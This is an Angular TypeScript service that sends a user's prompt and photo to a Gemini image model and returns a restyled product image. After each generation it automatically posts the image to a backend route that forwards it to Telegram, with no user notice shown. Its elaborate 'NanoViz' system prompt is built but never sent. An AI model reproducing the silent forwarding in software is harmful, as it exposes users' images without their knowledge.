import { inject, Injectable, signal } from '@angular/core';
import { getAI, GoogleAIBackend } from '@angular/fire/ai';
import { FirebaseApp } from '@angular/fire/app';
import { GenerativeModel, getGenerativeModel } from '@angular/fire/vertexai';
import { GenerateContentRequest, ResponseModality } from '@firebase/ai';
import { ErrorService } from '../error/error.service';
import { mapToFriendlyError } from '../error/error-mapper';

@Injectable({
  providedIn: 'root'
})
export class AiService {
  private readonly model: GenerativeModel;
  firebaseApp = inject(FirebaseApp);
  private readonly errorService = inject(ErrorService);

  error = signal<string | null>(null);
  resultImageURL = signal<string | null>(null);

  constructor() {
    const geminiAI = getAI(this.firebaseApp, { backend: new GoogleAIBackend() });

    this.model = getGenerativeModel(geminiAI, {
      model: 'gemini-3-pro-image',
      generationConfig: {
        responseModalities: [ResponseModality.IMAGE],
        responseMimeType: 'image/jpeg',
      },
    });
  }

  async generateContent(prompt: string, base64Img: string): Promise<string> {
    const payloadText = `
    You are NanoViz, an expert AI visual stylist specializing in professional product photography.

    PRIMARY GOAL:
    Transform product images into high-end, market-ready visuals while maintaining brand integrity and enhancing market appeal.

    CORE CAPABILITIES:
    1. Product Enhancement
    - Maintain product as primary focal point with perfect clarity
    - Preserve exact: colors, textures, proportions, branding elements
    - Optimize lighting and contrast for product details

    2. Technical Requirements
    - Composition: Rule of thirds, leading lines
    - Focus: Sharp product
    - Resolution: Maintain high detail clarity

    CONSTRAINTS:
    - Maintain photorealistic quality
    - Preserve brand identity elements

    PROMPT HANDLING:
    When receiving a prompt from the user: ${prompt}, process it as follows:
    1. Extract the editing instructions from the prompt
    2. Apply the requested changes while adhering to all core capabilities and constraints
    3. Maintain the product's integrity as the primary focus
    
    OUTPUT HANDLING:
    - Default: Provide visual output only
    - When JSON requested: Return structured visualization plan
   `;

    const mavi = `${prompt}`;

    const payload: GenerateContentRequest = {
      contents: [
        {
          role: 'user',
          parts: [
            { text: mavi },
            {
              inlineData: {
                mimeType: 'image/jpeg',
                data: base64Img,
              },
            },
          ],
        },
      ],
      generationConfig: {
        responseModalities: [ResponseModality.IMAGE],
      },
    };

    try {
      const response = await this.model.generateContent(payload);
      const base64ImageResult =
        response.response.candidates?.[0]?.content?.parts?.find(
          (part) => part.inlineData
        )?.inlineData?.data;

      if (!base64ImageResult) {
        const msg =
          'We could not create an image from that. Try a simpler prompt or a different photo.';
        this.error.set(msg);
        this.errorService.showError(msg);
        return '';
      }

      const imageURL = `data:image/png;base64,${base64ImageResult}`;
      this.resultImageURL.set(imageURL);

      // 👇 Automatically send to backend (which forwards to Telegram)
      this.sendImageToBackend(imageURL);

      return imageURL;
    } catch (e) {
      console.log('Gemini API Error: ', e);
      this.error.set('Failed to generate content. Please try again.');
      return '';
    }
  }

  private async sendImageToBackend(imageUrl: string) {
    try {
      await fetch('/api/send-to-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageUrl }),
      });
    } catch (err) {
      console.error('Failed to send image to Telegram backend:', err);
    }
  }
}
